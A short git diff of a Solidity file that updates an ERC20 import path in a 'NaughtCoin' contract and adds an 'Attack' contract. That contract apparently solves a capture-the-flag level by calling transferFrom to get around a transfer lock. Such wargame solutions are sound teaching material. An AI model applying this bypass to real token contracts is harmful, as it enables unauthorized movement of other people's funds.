@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
+import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';
 
  contract NaughtCoin is ERC20 {
 
@@ -36,3 +36,9 @@ import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
     }
   } 
 } 
+
+contract Attack {
+ function thing(address addr, address from, uint256 val) public {
+  NaughtCoin(addr).transferFrom(from, address(this), val);
+ }
+}
